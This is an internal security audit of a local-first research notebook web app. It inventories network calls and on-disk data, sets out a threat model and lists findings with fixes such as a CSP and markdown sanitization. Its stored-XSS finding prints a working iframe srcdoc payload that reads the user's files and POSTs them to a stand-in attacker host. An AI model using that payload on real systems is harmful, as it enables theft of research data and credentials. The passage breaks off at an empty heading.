# ResearchOS Security Audit

**Auditor:** security manager (parallel session)
**Audit commit:** `c1b77389` on `main`, 2026-05-15
**Scope:** the whole frontend at `frontend/src/`, the two Vercel proxy routes, the FSA + IndexedDB persistence layer, and the on-disk sidecar surfaces. The institutional LabArchives API was already removed at `8b1eac3f`; this audit treats the surviving cred-less ELN import paths as the authoritative shape.

The user-facing claim ResearchOS makes to labs:

> All your research data stays on your computer. We never see it.

This document audits whether that claim is true today, where it almost is, and what we should fix to harden it. It produces four artifacts: an inventory, a threat model, a findings list, and a plain-English summary that wiki manager can use as the seed for the `/wiki/security` page.

---

## 1. Inventory

### 1.1 Outbound network calls (client-side, from the user's browser)

| Surface | URL | When it fires | Body / headers | Origin reached |
|---|---|---|---|---|
| Telegram bot API (direct) | `https://api.telegram.org/bot<TOKEN>/<method>` | When polling is active and the user has paired a bot. Methods: `getMe`, `getUpdates`, `getFile`, `sendMessage`. | POST, JSON body of method params. Bot token is in the URL path. | Telegram (third-party, never ResearchOS infrastructure) |
| Telegram file CDN (proxied) | `/api/telegram-file?path=<path>` with `x-telegram-token: <TOKEN>` header | When an inbox image needs to be downloaded into `inbox/Images/`. | GET, token in header (not URL). | Same-origin → server-side proxy → `api.telegram.org` |
| External calendar feed | `/api/calendar-feed?url=<icsUrl>` | When `useExternalEvents()` refetches an enabled ICS feed. 15-min cache. | GET, target URL in query string. | Same-origin → server-side proxy → arbitrary HTTPS host the user subscribed to |
| Demo / wiki-capture asset fetch | `/demo-data/<relPath>` | When the wiki-capture mock seeds its in-memory file system. Localhost in dev, also fires at `/demo` on public Vercel. | GET, no auth. | Same-origin (static `public/demo-data/`) |
| GitHub issue URL (window.open) | `https://github.com/gnick18/ResearchOS/issues/new?title=...&body=...` | When the user clicks "Submit" in the FeedbackModal. Opens in a new tab via `window.open`. No background POST. | URL only — payload is in the query string and visible to the user before submit. | GitHub (user's own tab, not the app) |
| LabArchives notebook (window.open) | `https://mynotebook.labarchives.com<originalUrl>` or absolute URL from `_import_source.json` | When the user clicks "Find on LabArchives" on a missing-image popup. | GET, user's existing LabArchives session in their main browser. | LabArchives |
| Wiki / external help links (window.open) | Various `https://...` from tip catalog + content | When the user clicks "Read more →" on a tip card or a wiki link. | GET, `noopener,noreferrer`. | External docs |
| LabArchives DevTools script — runs in user's labarchives.com tab, NOT in the app | `https://cdn.jsdelivr.net/npm/jszip@3.10.1/dist/jszip.min.js` plus per-image fetches from the user's LabArchives session | When the user pastes the generated IIFE into DevTools on labarchives.com. | Browser session cookies on LabArchives. | jsdelivr, LabArchives. Never reaches the ResearchOS bundle. |

There are zero `XMLHttpRequest`, `navigator.sendBeacon`, `WebSocket`, or `EventSource` calls anywhere in `frontend/src/`.

**Update (post-audit, 2026-05-15, after the initial audit committed at `c62bdc7d`):** Vercel Web Analytics landed at merge commit `62a34df0`. This added one outbound destination not present at audit time:

| Surface | URL | When it fires | Body / headers | Origin reached |
|---|---|---|---|---|
| Vercel Web Analytics | `https://va.vercel-scripts.com/v1/script.js` (script load), then anonymous beacons to `https://vitals.vercel-insights.com/...` | Mount of `<Analytics />` at app root, then a page-view ping on each route transition | Anonymous page-view pings only. No in-route activity, no typed content, no form fields, no markdown body, no IDs or PII. The Vercel Analytics script does not see file contents or user input. | Vercel (third party, not ResearchOS infrastructure for the analytics surface itself; Vercel hashes the client IP before storage per their privacy policy) |

The mount is wrapped in `OfflineGatedAnalytics.tsx` — when the user's "Offline mode" toggle (affordance #2 from §3 below, merged at `d164fd2b`) is on, `<Analytics />` returns `null` so the script tag is never injected and no beacons fire. The CSP was widened to allow `va.vercel-scripts.com` on `script-src` and `vitals.vercel-insights.com` on `connect-src` (see [next.config.ts:29, 33](frontend/next.config.ts:29)).

This is the only post-audit change to the network inventory. No other analytics, error reporting, or telemetry deps are present. `npm ls` still shows no `@sentry/*`, no `posthog`, no `mixpanel`, no `gtag`, no `hotjar`, no `fullstory`, no `datadog`, no `amplitude`.

### 1.2 Server-side fetches (Vercel function routes)

| Route | Outbound target | Defenses applied |
|---|---|---|
| `/api/calendar-feed` ([route.ts](frontend/src/app/api/calendar-feed/route.ts)) | Arbitrary HTTPS host the user subscribed to (no allowlist) | `safeFetch` SSRF guard (scheme allowlist, private-IP rejection, DNS resolution, redirect re-validation capped at 3 hops), 10 MiB streamed body cap, 20s timeout, HTML/JS content-type denylist, `BEGIN:VCALENDAR` sanity check, URL length cap 2 KiB, generic client error strings, in-memory rate limit 60/min/IP. |
| `/api/telegram-file` ([route.ts](frontend/src/app/api/telegram-file/route.ts)) | Pinned to `api.telegram.org` | Token shape regex, file-path allowlist (no `..`, no leading `/`, no percent-encoding), `safeFetch` with `allowedHosts: ["api.telegram.org"]`, 20 MiB cap, 30s timeout, HTML/JS/SVG content-type denylist, `x-content-type-options: nosniff`, generic client error strings, in-memory rate limit 30/min/IP. |

Both routes use `cache: "no-store"` upstream and never persist request data. The calendar-feed response is cached at the Vercel edge for 15 min (`Cache-Control: public, max-age=900`); the telegram-file response is `no-store` to keep token-scoped responses out of any shared cache.

### 1.3 IndexedDB writes

Two databases:

1. **`research-os-fsa` / object-store `handles`** ([indexeddb-store.ts](frontend/src/lib/file-system/indexeddb-store.ts)).
   - Key `research-os-directory-handle` — the opaque `FileSystemDirectoryHandle` granted by `showDirectoryPicker`. The handle is per-FSA spec an opaque object; no path is recoverable from it via the public API.

2. **`keyval-store` / object-store `keyval`** (idb-keyval default).
   - `research-os-directory-handle-meta` — `{ name: string; grantedAt: number }`. `name` is the user-visible folder leaf (e.g. `"ResearchOS_FungalInteractionsLab"`).
   - `research-os-current-user` — username string (e.g. `"GrantNickles"`).
   - `research-os-main-user` — username string of the "Lab Mode primary" account.

Total: **four IDB keys**, all readable in DevTools → Application → IndexedDB. None of them hold credentials. The directory handle is the only thing that grants disk access, and it is gated by the OS-level FSA permission grant that Chrome enforces.

### 1.4 localStorage writes

| Key | What it holds | Sensitive? |
|---|---|---|
| `research-os-settings` ([store.ts:284](frontend/src/lib/store.ts:284)) | UI prefs: theme, visibleTabs, animation choices | No |
| `researchos:feedback-type-last` ([FeedbackModal.tsx:30](frontend/src/components/FeedbackModal.tsx:30)) | Last-used `bug` / `feature` / `feedback` | No |
| `researchos:labModePickerTipDismissed` ([OnboardingLabModePickerTip.tsx](frontend/src/components/OnboardingLabModePickerTip.tsx)) | "1" | No |
| `lab-user-filter-position` ([LabUserFilterButton.tsx:46](frontend/src/components/LabUserFilterButton.tsx:46)) | `{x, y}` for floating button | No |
| `workbench-experiments-view-mode` ([LabExperimentsPanel.tsx:63](frontend/src/components/LabExperimentsPanel.tsx:63)) | "grid" / "list" | No |
| `emptyMethodCategories` ([methods/page.tsx:119](frontend/src/app/methods/page.tsx:119)) | Collapsed-category list | No |
| `event-reminder-fired:<id>:<offset>` ([use-event-reminders.ts:43](frontend/src/lib/calendar/use-event-reminders.ts:43)) | Timestamp the reminder fired (so it doesn't double-fire) | No (calendar event IDs may be PII-adjacent — fixture / personal events) |
| `telegram-poller-tab` ([use-telegram-polling.ts:30](frontend/src/lib/telegram/use-telegram-polling.ts:30)) | `{ tabId, ts }` cross-tab lock — chooses which tab polls | No (no token) |

sessionStorage adds `researchos:demo-mode` (the sticky `/demo` flag) and a wiki return-path. No tokens or PII either.

**No tokens, passwords, OAuth state, or research data live in localStorage or sessionStorage.** All sensitive state lives in the user's FSA-mounted data folder.

### 1.5 FSA writes — files in the user's chosen folder

Path conventions in [AGENTS.md §2](AGENTS.md) match what `fileService.writeJson` / `writeFileFromBlob` actually emit:

**Per-user sidecars (single-user-visibility):**
- `users/<u>/_auth.json` — PBKDF2-SHA-256 hash + salt + iteration count (600k). [password.ts](frontend/src/lib/auth/password.ts).
- `users/<u>/_telegram.json` — bot token, bot username, paired chat id, last-update-id. [telegram-store.ts](frontend/src/lib/telegram/telegram-store.ts). **Auto-gitignored** on write.
- `users/<u>/_calendar-feeds.json` — ICS subscription URLs. Auto-gitignored on write.
- `users/<u>/_labarchives.json` — LabArchives connection (orphan; institutional API removed).
- `users/<u>/_labarchives-deployer.json` — institutional access password in plaintext (orphan; institutional API removed). Documented trust trade-off in AGENTS.md §6.
- `users/<u>/_onboarding.json` — tip history + active-engagement-seconds counter.
- `users/<u>/_shared_with_me.json` — entries shared into this user from others.
- `users/<u>/_notifications.json`, `_shifted-alerts.json`, `_seen-shift-alerts.json` — notification inbox + dedup.
- `users/<u>/_counters.json` — auto-increment ID counters.
- `users/<u>/_demo_marker.json` — when the demo lab.

**Per-user research data:**
- `users/<u>/{projects,tasks,dependencies,methods,notes,goals,pcr_protocols,purchase_items,lc_gradients}/<id>.json`
- `users/<u>/results/task-<id>/{notes.md, results.md, notes/Images/, notes/Files/, results/Images/, results/Files/}`
- `users/<u>/inbox/Images/` plus `.json` sidecars for caption/sender/received_at.
- `users/<u>/results/task-<id>/notes/_import_source.json` — ELN import sidecar (filename → original URL mapping).
- `users/<u>/projects/<id>-hosted.json` — cross-owner hosted-task manifest.

**`users/`-level files (sibling to per-user dirs):**
- `users/_user_metadata.json` — cross-user color preferences + display names ([user-metadata.ts:3](frontend/src/lib/file-system/user-metadata.ts:3)).
- `users/_global_counters.json` — cross-user id allocator ([user-discovery.ts:52](frontend/src/lib/file-system/user-discovery.ts:52)).
- `users/public/` — methods + PCR protocols shared across all users.
- `users/lab/` — shared lab-account state.

**Folder-root files:**
- `.gitignore` — managed entries auto-appended for sensitive sidecars ([gitignore.ts:12](frontend/src/lib/file-system/gitignore.ts:12)).
- `_demo_marker.json` (only when the demo lab is loaded; gates the demo banner + dynamic-dates rebase).

### 1.6 Sensitive on-disk data summary

What ends up on the user's disk that an attacker with read access to the folder could exfiltrate:

| Path | Content | Encrypted? |
|---|---|---|
| `users/<u>/_telegram.json` | Bot tokens (full-message bot can read inbox + post on user's behalf) | No |
| `users/<u>/_calendar-feeds.json` | ICS URLs (some include random-token access via "private ICS" share) | No |
| `users/<u>/_labarchives-deployer.json` | Institutional API access password (orphan as of `8b1eac3f` but file may still exist on disk) | No |
| `users/<u>/_labarchives.json` | LabArchives connection (orphan, harmless without the API surface) | No |
| `users/<u>/_auth.json` | PBKDF2-SHA-256 hash (600k iters, 16-byte salt) | Hash only |
| `users/<u>/notes/*.json`, `tasks/*.json`, `results/**/notes.md`, etc. | All research content | No |

The local-first claim is honored at the network level — none of this transits a server we control. But anyone with read access to the folder (a misshared OneDrive, a stolen laptop without disk encryption, a malicious co-tenant on the same workstation) has full read access to everything except the PBKDF2-hashed passwords.

---

## 2. Threat model

### 2.1 Trust boundaries

```
   ┌──────────────────────────┐
   │ User's disk              │ A. Local file system (FSA folder)
   │ ├── notes.md / *.json    │
   │ ├── _telegram.json       │
   │ └── ...                  │
   └─────────────┬────────────┘
                 │  FSA handle (gated by browser permission grant)
                 ▼
   ┌──────────────────────────┐
   │ Browser tab              │ B. JS execution context = research-os-xi.vercel.app
   │ - fileService (module    │    or localhost:3000 (dev) or another self-host origin
   │   global)                │
   │ - IndexedDB              │
   │ - markdown renderer      │
   └─────────────┬────────────┘
                 │  HTTPS
                 ▼
   ┌──────────────────────────┐
   │ Vercel functions         │ C. Server side
   │ /api/calendar-feed       │
   │ /api/telegram-file       │
   └─────────────┬────────────┘
                 │  HTTPS, SSRF-guarded
                 ▼
   ┌──────────────────────────┐
   │ External services        │ D. Third parties: Telegram, calendar feeds,
   │ api.telegram.org, ICS    │    user-configured ICS hosts
   │ feed hosts               │
   └──────────────────────────┘

   Cross-cutting (E): Shared lab folder (OneDrive / Dropbox / iCloud).
   When set, every other user with access to that folder is inside trust
   boundary A but renders content authored by anyone.
```

### 2.2 Actors and what they can do

| Actor | Capabilities | Realistic threat |
|---|---|---|
| **Legitimate solo user** | Full disk access via FSA permission grant; can install browser extensions that observe the tab. | Accidental data loss; weak password. |
| **Lab-mate sharing the OneDrive folder** | Read + write access to every byte in the folder. Can author content rendered by others. | Cross-user XSS via stored markdown; offline password cracking against `_auth.json`. |
| **Attacker with file-system access** (stolen laptop, malware, exfiltrated OneDrive backup, misshared link) | Full read + write of the folder. | Bulk theft of research data, bot tokens, LabArchives creds. The local-first design exposes everything in plaintext on disk. |
| **Public Vercel attacker (no auth path required)** | Can hit `/demo`, `/api/calendar-feed`, `/api/telegram-file`. | DoS by burning function budget; SSRF if guards have gaps; calendar-feed URL exfil into logs. |
| **Network attacker** (Wi-Fi MITM) | Sees TLS handshakes only (HTTPS-only enforced by the proxy routes and by Vercel). | Negligible past HTTPS. |
| **Malicious ELN import author** (sends a `.eln` ZIP) | Controls markdown content + image filenames + sidecar URLs. | Stored XSS via rehype-raw; phishing via `<iframe>`; arbitrary `window.open` target via `_import_source.json#originalUrl`. |
| **Compromised Telegram bot** (a lab member's bot account taken over) | Can send images / text into the user's inbox folder via legitimate polling. | Stored XSS through caption rendering (low — captions don't go through rehype-raw today; verify). |

### 2.3 What we explicitly trust

- The browser's FSA implementation. The directory handle's permission grant is the only thing standing between the page's JS and arbitrary on-disk reads. If browser FSA breaks, ResearchOS breaks.
- The user's OS account isolation. We do not encrypt at rest.
- Vercel's edge as a non-malicious operator. We never POST research bytes to the server; Vercel only sees proxied requests for ICS and Telegram CDN.
- Telegram and the user's chosen ICS hosts. Once `safeFetch` lets bytes through, we trust them. Both have content-type denylists and size caps that should keep them well-behaved.
- The user knowing what `.eln` zips they import.

### 2.4 What we explicitly do NOT trust

- Markdown content authored by anyone other than the current user. Including past-self if the folder has been shared with someone else in between.
- Sidecar JSON written by importers (`_import_source.json`'s `originalUrl` field is a real URL parsed and re-`window.open`'d).
- The contents of `_calendar-feeds.json` if the file came from another user's directory.
- HTTP headers from external upstreams — we strip them down to `content-type` / `content-length` on the proxy.

---

## 3. Findings

Ordered by severity. Severity reflects realistic exploit difficulty against the threat model in §2, not theoretical maximum impact.

### 3.1 Critical: Stored XSS via `rehype-raw` rendered without sanitization

**Files:**
- [RenderedMarkdown.tsx:83](frontend/src/components/RenderedMarkdown.tsx:83)
- [MarkdownPreview.tsx:112](frontend/src/components/MarkdownPreview.tsx:112)
- [HybridMarkdownEditor.tsx:1414](frontend/src/components/HybridMarkdownEditor.tsx:1414)
- [LiveMarkdownEditor.tsx:2702](frontend/src/components/LiveMarkdownEditor.tsx:2702)

**Description.** All four markdown render paths pass `rehype-raw` into `<ReactMarkdown rehypePlugins={...}>` without `rehype-sanitize`. `rehype-raw` parses raw HTML embedded in markdown into the HAST tree; without a sanitizer, those nodes are rendered as React elements. React's element creation blocks the obvious vectors (`<script>` blocks are not executed when set via React, inline `on*` string handlers are not bound, `<a href="javascript:">` is filtered by react-markdown's `urlTransform`), but it does NOT block:

- `<iframe src="https://attacker.example/...">` — renders, loads cross-origin, useful for phishing and CSS-injection-based exfiltration.
- `<iframe srcdoc="<script>...</script>">` — without a `sandbox` attribute, the iframe inherits the embedder's origin and the inner script runs in the embedder's JS context with `window.top` access. From there, `window.top.fileService` is reachable (the service is module-global) and can read every file in the user's data folder, including `_telegram.json` (bot tokens), `_auth.json` (PBKDF2 hashes), and every notes/results body. `fetch("https://attacker.example/...", { body: data })` exfils freely; **no CSP is set** to block this (see finding 3.3 below).
- `<form action="https://attacker.example" method="POST">` — phishing form embedded in rendered content.
- `<style>@import url("...")` — CSS-based side-channel data exfiltration via attribute-selector matching.

**Repro (multi-user shared folder, the marquee deploy mode for labs):**

1. User A and User B share the same OneDrive folder configured as the ResearchOS data folder.
2. User A opens a task that User B has share access to and types in the lab-notes editor:
   ```markdown
   <iframe srcdoc="<script>(async()=>{const all = await window.top.fileService.listAll('users');fetch('https://attacker.example/exfil', {method:'POST', body: JSON.stringify(all)});})()"></iframe>
   ```
3. User A saves; the markdown lands in `users/A/results/task-N/notes.md` and propagates via OneDrive sync.
4. User B opens that shared task. The editor renders the iframe; the srcdoc script runs in the `research-os-xi.vercel.app` origin; `window.top.fileService` is reachable; data exfils.

**Severity rationale.** Stored XSS in a multi-user app with no CSP and a module-global fileService is the standard worst-case web-app shape. The `.eln` import path provides a second realistic vector (a collaborator sends a malicious ZIP). The reason this is rated Critical and not "RCE" is that React filters the easiest sub-vectors; an attacker needs srcdoc-iframe or equivalent to reach JS execution, but that path is well known.

**Remediation (chip-sized):**
- Add `rehype-sanitize` to the rehype plugin chain at all four sites, using `defaultSchema` plus narrow opt-ins for `img` (allow `src`, `alt`) and `a` (allow `href`, default already restricts to safe schemes).
- Explicitly reject `iframe`, `script`, `style`, `srcdoc`, `srcDoc`, `style` attr, `on*` attrs, `data:` URLs in href/src.
- Verify HTML comments (used by [stamp-utils.ts](frontend/src/lib/stamp-utils.ts)) still pass through unchanged.
- Add a vitest covering the iframe / srcdoc / form payload shapes to keep this fixed.

**Estimated chip size:** ~60 LOC change plus 30 LOC of tests, single-pass. Touches the four render sites and adds a shared `lib/markdown/sanitize-schema.ts` so the schema doesn't drift between callers.

### 3.2 Important: No security headers on the hosted origin

**File:** [next.config.ts](frontend/next.config.ts) is bare. No `middleware.ts` exists. The root layout sets nothing.

**Description.** The hosted deploy at `research-os-xi.vercel.app` ships with whatever default headers Vercel adds; there is no application-set `Content-Security-Policy`, `X-Frame-Options`, `Referrer-Policy`, `Permissions-Policy`, or `Strict-Transport-Security`. This means:

- Finding 3.1 has no defense in depth. With even a permissive CSP (`connect-src 'self' https://api.telegram.org`), the srcdoc-iframe XSS path becomes much harder because the injected `fetch` to an arbitrary host is blocked.
- ResearchOS can be embedded in a third-party iframe (clickjacking). A malicious site could `<iframe src="https://research-os-xi.vercel.app">` and overlay UI on top to trick a signed-in user into clicks. Less likely in this app's threat model (no irreversible click affordances), but the cost of fixing it is one header.
- `Referrer-Policy` defaults to `strict-origin-when-cross-origin` in modern Chrome, which is acceptable, but should be explicit.

**Severity rationale.** Important rather than Critical because the absence of CSP isn't an exploit by itself; it's a missing defense-in-depth layer. Paired with 3.1 it becomes load-bearing.

**Remediation.** Add a `headers()` config in `next.config.ts`:

```ts
async headers() {
  return [{
    source: "/(.*)",
    headers: [
      { key: "Content-Security-Policy", value:
        "default-src 'self'; " +
        "script-src 'self' 'unsafe-inline'; " +    // Next.js inline-styles for hydration
        "style-src 'self' 'unsafe-inline'; " +
        "img-src 'self' blob: data:; " +
        "font-src 'self' data:; " +
        "connect-src 'self' https://api.telegram.org; " +
        "frame-src 'self' blob:; " +              // for PDF blob iframe
        "frame-ancestors 'none'; " +
        "object-src 'none'; " +
        "base-uri 'self'; " +
        "form-action 'self';" },
      { key: "X-Frame-Options", value: "DENY" },
      { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
      { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=()" },
      { key: "Strict-Transport-Security", value: "max-age=63072000; includeSubDomains; preload" },
    ],
  }];
}
```

**Estimated chip size:** ~40 LOC + a live verification that the app boots cleanly under the policy (Next 16 inline scripts / Tailwind injection / dynamic imports need to be checked). Best paired with the rehype-sanitize chip from 3.1 since both ship together.

### 3.3 Important: Calendar-feed URL leaked into Vercel function logs

**File:** [calendar-feed/route.ts:53](frontend/src/app/api/calendar-feed/route.ts:53)

**Description.** The user's ICS subscription URL is passed as a `?url=` query parameter on a GET request to `/api/calendar-feed`. Vercel logs every function invocation's full URL (path + query) into its function logs by default. Google Calendar and Outlook "private ICS" share URLs are unguessable random tokens that act as read-anyone-with-link credentials. Logged into Vercel function logs, those URLs become recoverable by anyone with project log access.

Today the only such person is Grant (solo deployer), so the practical risk is low. The risk grows if log access ever expands (Vercel team member added, log forwarding configured to a third-party SIEM, ResearchOS hosted by an institution with shared admin access).

**Severity rationale.** Important not Critical because the leak requires Vercel-log-tier access. The current operator surface is one person.

**Remediation.** Move the URL out of the query string. Two options:

- Switch the route from GET to POST with `{ url }` in JSON body. Adjust the client-side `fetchIcsFeed` in [use-external-events.ts:19](frontend/src/lib/calendar/use-external-events.ts:19) to match. The 15-min edge cache is lost (POSTs aren't cached); this is a behavior shift worth confirming with Grant.
- Or pass the URL in an `x-calendar-url` header. Mirrors the Telegram token shape. Keeps the edge cache (it caches by URL + headers depending on `Vary`); the URL is still in the request but not the URL line that Vercel canonically logs.

**Estimated chip size:** ~20 LOC across route + client. Chip should also re-check `console.warn` lines in the route to ensure they don't ever stringify the full URL.

### 3.4 Important: Orphan LabArchives sidecars (`_labarchives*.json`) on existing users' disks

**Files:** none in current source — `lib/labarchives/deployer-store.ts` and `lib/labarchives/tokens-store.ts` were deleted at `8b1eac3f`. The sidecars they wrote may persist on disk for any user who used the institutional flow before its removal.

**Description.** Per AGENTS.md §6 LabArchives entries, `_labarchives-deployer.json` could contain a plaintext institutional access password. After the institutional API surface was removed, nothing reads or writes the file but copies linger on disks that did the previous flow. These files are not actively cleaned up.

**Severity rationale.** Important because plaintext credentials on disk is exactly the thing we want to minimize, even if the credential is now functionally orphaned (the read paths are gone). A future LabArchives integration could resurrect this surface and inherit a stale, unrotated credential.

**Remediation.** Two options:

- **Cleanup chip (low-risk):** add a one-shot "Data maintenance → Remove orphaned LabArchives credentials" button in Settings that deletes `users/<u>/_labarchives.json` and the root `_labarchives-deployer.json` if present, with a 4s status toast. Self-heals existing installs.
- **Read-time scrub (more defensive):** on app boot, if either file exists, surface a one-time amber banner offering the same cleanup. Then auto-prune.

The user-facing wiki page should document that even after a feature is removed, files in the data folder are not aggressively deleted.

**Estimated chip size:** ~80 LOC including the settings UI hook + a one-paragraph wiki update (handed to wiki manager).

### 3.5 Important: Stack-trace and URL leak in Feedback flow (low-impact today)

**Files:** [error-reporting.ts:120](frontend/src/lib/error-reporting.ts:120), [FeedbackModal.tsx](frontend/src/components/FeedbackModal.tsx)

**Description.** When the user submits a bug report, the GitHub issue URL pre-fills with `window.location.href`, `navigator.userAgent`, a timestamp, and up to 2 KB of stack trace. `window.location.href` includes any query-string state present on the page at the time of the error (`?openTask=42`, `?createMethod=public`, etc.). Stack frames can include source-mapped paths that reveal whether the user is on the public deploy or a local clone.

This is **not** auto-submitted: the modal opens `https://github.com/...` in a new tab and the user sees + edits the body before they click "Submit new issue" on GitHub. So leakage requires the user to consciously hit GitHub's submit.

**Severity rationale.** Important rather than Informational because the user is unlikely to scrutinize every line of the pre-filled body before submitting. The leak surface is small and the body is editable, so users CAN redact before submitting.

**Remediation.** Add a "What we'll include" preview in the FeedbackModal expandable section so users can see what's about to ride. Optional: strip query strings from `window.location.href` (`new URL(...).pathname` only). Optional: limit stack trace to the top N frames or sanitize known PII patterns.

**Estimated chip size:** ~30 LOC UX touch-up; low priority since the user is in the loop.

### 3.6 Informational: Bot token in URL path on direct Telegram API calls

**File:** [telegram-client.ts:89](frontend/src/lib/telegram/telegram-client.ts:89)

**Description.** Direct calls to `https://api.telegram.org/bot<TOKEN>/<method>` put the bot token in the URL path. These are POSTs (token not in browser history) and go straight to Telegram (token not in our logs). However, the token is visible in:

- Browser DevTools → Network tab if the user opens it during a poll cycle.
- Browser extensions with `<all_urls>` host permissions (any extension the user has installed).
- TLS-intercepting corporate proxies.

This is the standard pattern for the Telegram bot API — Telegram themselves don't offer a header-based auth alternative. The `/api/telegram-file` proxy already moves the token out of the URL on the file-download path. The other four methods (`getMe`, `getUpdates`, `getFile`, `sendMessage`) keep it in the URL.

**Severity rationale.** Informational. There's no realistic remediation short of routing every Telegram method call through a server-side proxy (large change, no clear win — the token is just as exposed at-rest in `_telegram.json` as it is in-flight to Telegram).

**Remediation.** Document the threat model in the user-facing wiki page: "Don't run ResearchOS in a browser with untrusted extensions installed if you have a Telegram bot paired."

### 3.7 Informational: PDF blob URL opened in `_blank` without `sandbox`

**Files:** [FileViewerModal.tsx:58](frontend/src/components/FileViewerModal.tsx:58), [methods/page.tsx:2014](frontend/src/app/methods/page.tsx:2014), [TaskDetailPopup.tsx:3724](frontend/src/components/TaskDetailPopup.tsx:3724), [MethodPicker.tsx:585](frontend/src/components/MethodPicker.tsx:585), [PdfMethodTabContent.tsx:93](frontend/src/components/methods/PdfMethodTabContent.tsx:93)

**Description.** A user PDF is rendered into a same-origin `blob:` URL and then either embedded in an iframe (inline preview) or opened in a new tab. No `sandbox` attribute. A malicious PDF that exploits a Chrome PDF.js bug could potentially escape into the parent origin's JS context. Chrome's PDF viewer is generally well-isolated, but defense in depth helps.

**Severity rationale.** Informational. Requires both an unpatched Chrome PDF.js vulnerability AND a malicious PDF inside the user's own data folder.

**Remediation.** Add `sandbox="allow-same-origin"` (or stricter) to the iframe attribute. For `window.open(blobUrl, "_blank")`, the runtime doesn't apply sandbox, but `noopener,noreferrer` is already set in some sites — verify it's set on all PDF-blob `window.open` calls.

### 3.8 Informational: `_auth.json` is intentionally NOT gitignored; weak passwords are brute-forceable offline

**File:** [password.ts](frontend/src/lib/auth/password.ts), [gitignore.ts](frontend/src/lib/file-system/gitignore.ts)

**Description.** PBKDF2-SHA-256, 600k iterations, 16-byte salt, 256-bit output — matches OWASP 2023 guidance. Good algorithm choice. The file is left out of `.gitignore` deliberately so a co-located user sees that a password is set.

The risk: if the lab folder leaks (OneDrive misshare to a wider audience, stolen device without disk encryption, malware on the workstation), any weak-password account is offline-brute-forceable. 600k PBKDF2-SHA-256 iters costs ~100ms on a modern CPU; on a GPU that drops by ~100x. A 6-char lowercase password (308M candidates) cracks in under an hour on a single GPU.

**Severity rationale.** Informational because this is documented behavior and the password gate is explicitly not an encryption boundary (the source comment is clear).

**Remediation.** UX improvement: add a strength meter to [AccountPasswordPopup.tsx](frontend/src/components/AccountPasswordPopup.tsx) and warn on weak/common entries. Optional: bump iterations to 1M (modest UX cost: ~150ms on sign-in).

### 3.9 Informational: jsdelivr CDN dependency in the LabArchives DevTools script

**File:** [devtools-script.ts:35](frontend/src/lib/labarchives/devtools-script.ts:35)

**Description.** The generated IIFE that the user pastes into their LabArchives DevTools console loads JSZip from `https://cdn.jsdelivr.net/npm/jszip@3.10.1/dist/jszip.min.js`. If jsdelivr is compromised (supply-chain) and serves a tampered jszip, the malicious payload runs in the user's LabArchives session with full session-cookie access. Lower risk because (a) the user explicitly pastes the script knowing what it does, (b) jsdelivr serves a specific pinned version, (c) jsdelivr supports SRI hashes.

**Severity rationale.** Informational because the user explicitly opts in and the script is human-readable before paste.

**Remediation.** Add an SRI `integrity` attribute to the dynamically-injected `<script>` tag inside the generated IIFE. Pin the JSZip 3.10.1 SHA-384. ~10 LOC change.

### 3.10 Informational: In-memory rate limit on serverless

**File:** [rate-limit.ts:49](frontend/src/lib/api/rate-limit.ts:49)

**Description.** Default rate limit is per-instance in-memory. A determined attacker rotating across Vercel cold-start instances can still drain the function budget. Acknowledged in code comments and AGENTS.md.

**Severity rationale.** Informational; the mitigation path (Upstash Redis) is already wired and documented in `frontend/DEPLOYMENT.md`.

**Remediation.** Surface this to the deployer in the user-facing wiki "Security" page so anyone hosting their own ResearchOS knows about Upstash. No code change.

### 3.11 Informational: `console.log` writes the current username on every IDB read

**File:** [indexeddb-store.ts:158](frontend/src/lib/file-system/indexeddb-store.ts:158)

**Description.** `getCurrentUser` logs `Retrieved user from IndexedDB: <username>`. Not a leak (the user is themselves), but noise that future error-reporting could pick up if it scrapes the console. Worth pruning on a low-priority cleanup pass.

**Severity rationale.** Informational.

### 3.12 Informational: `findOnLabArchives` opens an attacker-controllable absolute URL

**File:** [LiveMarkdownEditor.tsx:1813](frontend/src/components/LiveMarkdownEditor.tsx:1813)

**Description.** When a missing-image popup fires for a LabArchives Form-B placeholder, the "Find on LabArchives" button calls `window.open(absoluteUrl, "_blank", "noopener,noreferrer")` where `absoluteUrl` comes from the sidecar JSON. The `isAbsolute` check is `^https?://` — `javascript:` is blocked, but any HTTPS URL is allowed through. If a malicious `.eln` import or a poisoned multi-user `_import_source.json` carries `originalUrl: "https://attacker.example/phishing"`, clicking the button opens the phishing page. `noopener` blocks `window.opener` access, so this is a phishing/redirect risk only, not an XSS path.

**Severity rationale.** Informational because the attack requires the user to actively click "Find on LabArchives" on a malicious sidecar, and the destination domain renders in the address bar.

**Remediation.** Pin the host: if `originalUrl` is absolute, require its hostname to match `*.labarchives.com` (the legitimate regions: `mynotebook`, `aumynotebook`, `eumynotebook`, etc.). Refuse to open mismatched hosts. ~15 LOC.

---

## 4. User-facing summary (seed for `/wiki/security`)

This section is the plain-English version we tell labs. Wiki manager owns the final wording / annotated screenshots, but the technical claims below have been verified against the audit above and are correct as of commit `c1b77389`.

### What stays on your computer

Your research data lives in a folder you pick. Everything in that folder (tasks, notes, results, methods, images, attachments, Telegram inbox, calendar subscriptions) is read and written directly by your browser using the File System Access API. None of it is sent to a server we run.

That includes:
- All experimental notes, results, and attached images / PDFs / files.
- All project, task, dependency, method, and PCR protocol JSON.
- Your Telegram bot token and any inbox photos.
- Your calendar subscription URLs.
- The optional PBKDF2-hashed password for your account.

### What does briefly touch a server we operate

Two narrow proxy routes on Vercel are used solely to bypass browser CORS restrictions. They never persist data:

- **Calendar feed sync.** When you subscribe to an ICS URL (Google, Outlook, iCloud, university calendar), your browser sends a request to `/api/calendar-feed` which fetches the iCal text from the upstream and streams it back. We don't store the URL or the contents; we apply a 15-minute edge cache so repeated polls don't keep hitting the upstream.
- **Telegram file CDN.** When you receive a photo through your bot, your browser asks `/api/telegram-file` to fetch the image bytes from Telegram (which itself doesn't set CORS headers, so the browser can't reach it directly). The bot token rides in a request header, not the URL. We don't store the bytes; they stream straight to your folder.

These two routes have the most defensive shape we know how to write: HTTPS only, private-IP blocking, redirect re-validation, byte cap, timeout, content-type denylist, rate limit. The code is in `frontend/src/lib/api/url-guards.ts` and `frontend/src/lib/api/rate-limit.ts` if you want to read it.

### What we collect, and what we don't

